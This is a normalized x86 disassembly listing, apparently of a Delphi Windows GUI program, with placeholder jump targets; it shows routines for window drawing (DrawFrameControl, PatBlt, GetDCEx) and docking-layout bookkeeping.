mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_4477c0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_4129b0
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e4e4
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447818
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_41d8ec
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_41e09c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_41e03c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_41e03c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_41d8ec
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_41e03c
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41e03c
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4478a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_4477c0
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_447818
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_447818
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_4477c0
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_447818
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_447818
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_44797c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41dd3c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_447ad2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43c9d4
mov eax [ ebp - 0x4 ]
call sub_41e074
xor eax eax
push ebp
push sub_447ab5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41e564
xor eax eax
push ebp
push sub_447a98
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_441328
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447a9f
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41e564
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4412ec
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43d798
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_447ae0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_443128
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_43d840
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_43d7fc
mov ecx eax
xor edx edx
xor eax eax
call sub_4129b0
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_4445f8
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4129d8
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_447c54
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_447c54
pop ecx
mov eax ebx
call sub_4032a0
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_447c54
pop ecx
sub_447c88
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_447c54
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_4032a0
xor eax eax
mov [ esi + 0x64 ] eax
sub_447ce4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_446cf4
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_447d20
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_447d20
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_447f8d
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
mov edx [ ebp - 0x8 ]
pop eax
call sub_40433c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
mov eax [ ebx + 0x14 ]
call sub_446480
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ba4
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ba4
mov edx [ ebp - 0x10 ]
pop eax
call sub_40433c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_4032a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447f94
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404098
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_446830
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_4469a8
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_4469e4
mov eax [ ebx + 0x18 ]
call sub_446830
mov [ edx + 0x18 ] eax
push esi
push sub_448530
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_446d5c
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_4469e4
mov eax [ esi + 0x64 ]
call sub_4469a8
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_4032a0
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_448508
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_4032a0
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_44652c
mov edx eax
mov eax edi
call sub_4469d0
mov eax edi
call sub_446830
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_448530
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_446d5c
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_448530
mov edx [ eax + 0x14 ]
mov eax esi
call sub_446d5c
mov eax [ ebx + 0x14 ]
call sub_4032a0
mov eax edi
call sub_4032a0
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_447f9c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_443128
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407da4
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_4469d0
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_443094
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_4469d0
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_4483b8
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_448530
xor edx edx
mov eax edi
call sub_446d5c
sub_448078
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_4469a8
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402a78
mov edx eax
mov eax ebx
call sub_4469d0
sub_4480b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404524
xor eax eax
push ebp
push sub_44811f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404334
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448126
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_44812c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4481db
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_446738
mov eax [ ebp - 0x8 ]
call sub_4480b4
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_44812c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4481e2
lea eax [ ebp - 0x8 ]
call sub_404074
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_44812c
pop ecx
sub_4481e8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_448321
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4482d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_443094
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4482d7
mov eax [ ebp - 0x10 ]
call sub_4032a0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_4480b4
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_4430a8
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_4482d7
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_44812c
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448328
lea eax [ ebp - 0x14 ]
call sub_404074
retn
sub_448330
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_446a80
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_446aa8
call sub_448330
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_446a80
call sub_448330
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_4464b0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_4469a8
mov edx eax
mov eax ebx
call sub_4469d0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_4469d0
jmp r-xdata
sub_4483b8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_448330
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_4483fc
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_4469a8
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_4469d0
sub_44842c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_4445f8
mov edx eax
mov eax [ rw-data ]
call sub_448f8c
mov eax [ ebx + 0x14 ]
call sub_4445f8
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_448540
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44848c
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_448f8c
mov eax ebx
call sub_448540
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_4469d0
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_4469d0
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_4483b8
push ebx
push sub_448530
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_446d5c
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_448508
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_443094
test eax eax
jle r-xdata
push ebx
push sub_448530
xor edx edx
mov eax ebx
call sub_446d5c
sub_448540
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_446574
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_446574
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_4465e0
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_4465e0
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_41dc20
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_44862c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44862c
pop ecx
mov eax ebx
call sub_4469a8
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4469a8
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44862c
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_4469a8
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4243f4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
